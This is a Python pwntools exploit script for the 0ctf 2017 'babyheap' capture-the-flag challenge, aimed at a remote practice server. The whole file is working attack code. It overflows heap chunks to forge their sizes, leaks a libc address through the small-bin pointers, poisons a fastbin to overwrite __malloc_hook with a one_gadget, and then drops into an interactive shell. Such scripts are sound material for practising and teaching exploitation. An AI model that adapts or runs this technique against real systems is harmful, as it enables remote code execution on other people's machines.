from pwn import *
from LibcSearcher import *

import utils

context.arch = 'amd64'
context.log_level = 'debug'

target = remote('node4.buuoj.cn', 26178)
libc = ELF('/home/kali/glibc-all-in-one/libs/2.23-amd64/libc-2.23.so')
elf = ELF('../0ctf_2017_babyheap')

'''
sizeof(MyChunk) = 24
struct MyChunk {
  int is_valid;
  int size;
  char* buf;
};
'''

def allocate(size):
  # The maximum size is limited to 4096.
  target.sendlineafter(': ', '1')
  target.sendlineafter(': ', str(size))


def fill(index, content):
  # Fill does not check the size.
  # We consider using the unlink attack for fastbin.
  target.sendlineafter(': ', '2')
  target.sendlineafter('Index: ', str(index))
  target.sendlineafter('Size: ', str(len(content)))
  target.sendafter('Content: ', content)


def free(index):
  target.sendlineafter(': ', '3')
  target.sendlineafter('Index: ', str(index))


def dump(index):
  target.sendlineafter(': ', '4')
  target.sendlineafter('Index: ', str(index))


allocate(0x10)
allocate(0x10)
allocate(0x80)
allocate(0x10)
allocate(0x60)  # To prevent top chunk consolidation

# Write too long and 0x51 will replace the size of chunk1.
# So when freeing, the chunk size is falsified.
fill(0, p64(0xffffffff) * 3 + p64(0x51))
fill(2, p64(0xffffffff) * 5 + p64(0x91))

# So after freeing 1, we have a chunk sized 0x51 (which should be 0x21)
free(1)
# Allocating a chunk sized 0x51 will immediately take use of the previously freed fake chunk.
allocate(0x40)

# We changed the size of the chunk 2 to 0x91. So freeing it will let it be added to small bins.
# The first chunk in small bin will point to somewhere in main_arena.
fill(1, p64(0xffffffff) * 3 + p64(0x91))
free(2)

dump(1)  # Will print out &main_arena - 88

main_arena = u64(target.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00')) - 88
print('[+] The address of main_arena is {}.'.format(hex(main_arena)))

malloc_hook_addr = main_arena - 0x10
fake_small_bin_addr = malloc_hook_addr - 0x23
libc = LibcSearcher('__malloc_hook', malloc_hook_addr)
libc_base = malloc_hook_addr - libc.dump('__malloc_hook')
one_gadget = 0x4526a + libc_base
print('[+] The address of libc is {}'.format(hex(libc_base)))

free(4)
fill(3, p64(0xffffffff) * 3 + p64(0x71) + p64(fake_small_bin_addr))
allocate(0x60)
allocate(0x60)
fill(4, b'a' * 0x13 + p64(one_gadget))

allocate(1)
target.interactive()